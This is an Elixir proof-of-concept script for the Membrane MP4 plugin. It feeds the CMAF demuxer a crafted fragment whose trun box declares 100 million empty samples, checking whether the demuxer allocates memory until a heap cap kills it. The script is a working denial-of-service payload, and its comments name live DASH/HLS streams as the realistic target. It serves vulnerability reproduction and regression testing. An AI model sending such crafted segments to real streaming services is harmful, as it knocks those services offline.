# Same bug, same payload as repro.exs, but against Membrane.MP4.Demuxer.CMAF instead of
# Demuxer.ISOM. Demuxer.CMAF.Engine calls the same Container.parse!/1 (cmaf/engine.ex),
# so it's hit by the exact same unchecked trun sample_count. Unlike ISOM (which waits for a
# moov the fragment never supplies and so never even looks at trun), CMAF is the actual
# intended consumer of moof/traf/trun fragments - this is the realistic attack target
# (live streaming: DASH/HLS fMP4).
#
# The init segment from this checkout's fixtures is fed first, so the crafted fragment reaches
# the demuxing path rather than being turned away for arriving without one - which is also what
# the attack looks like in practice: a crafted segment on an already established stream.
#
# A ~50 MB per-process heap cap (kill: true) is installed first, so the demuxer is killed in a
# few seconds instead of swapping the host.
#
# Run it with `elixir repro_cmaf.exs`; it builds the plugin from this checkout, not from hex.
Mix.install([:membrane_core, {:membrane_mp4_plugin, path: __DIR__}])

Logger.configure(level: :critical)

sample_count = 100_000_000
:erlang.system_flag(:max_heap_size, %{size: 50_000_000, kill: true, error_logger: false})

box = fn type, body -> <<8 + byte_size(body)::32, type::binary, body::binary>> end

header = File.read!(Path.join(__DIR__, "test/fixtures/cmaf/ref_audio_header.mp4"))

# track 1, with the sample defaults in tfhd; the trun has only data_offset present, so every
# per-sample field is gated off and each of the declared samples carries zero bytes
tfhd = box.("tfhd", <<0::8, 0x18::24, 1::32, 1000::32, 4::32>>)
tfdt = box.("tfdt", <<1::8, 0::24, 0::64>>)

moof = fn data_offset ->
  trun = box.("trun", <<0::8, 0x1::24, sample_count::32, data_offset::signed-32>>)
  box.("moof", box.("traf", tfhd <> tfdt <> trun))
end

# data_offset points at the first byte of the mdat content, counted from the start of the moof
fragment = moof.(byte_size(moof.(0)) + 8) <> box.("mdat", <<1, 1, 1, 1, 2, 2, 2, 2>>)

defmodule ReproCmaf do
  use Membrane.Pipeline

  @impl true
  def handle_init(_ctx, segments) do
    spec =
      child(:source, %Membrane.Testing.Source{
        output: segments,
        stream_format: %Membrane.RemoteStream{type: :bytestream}
      })
      |> child(:demuxer, Membrane.MP4.Demuxer.CMAF)

    {[spec: spec], %{}}
  end
end

IO.puts("#{byte_size(fragment)}-byte fragment, declared sample_count = #{sample_count}")
IO.puts("starting pipeline; on vulnerable code the CMAF demuxer allocates until it is killed")

# The pipeline is linked, so trapping exits is what lets this script report the outcome instead
# of dying along with it: a heap-cap kill means the declared sample_count was expanded, anything
# else (a rejected fragment, or nothing happening at all) means it was not.
Process.flag(:trap_exit, true)
{:ok, _supervisor, _pipeline} = Membrane.Pipeline.start_link(ReproCmaf, [header, fragment])

receive do
  {:EXIT, _pid, reason} ->
    if inspect(reason) =~ ":killed" do
      IO.puts("FAILED: demuxer killed by the heap cap - it expanded the declared sample_count")
      System.halt(1)
    else
      IO.puts("PASSED: #{inspect(reason) |> String.slice(0, 160)}")
    end
after
  10_000 -> IO.puts("PASSED: pipeline still alive, nothing was expanded")
end
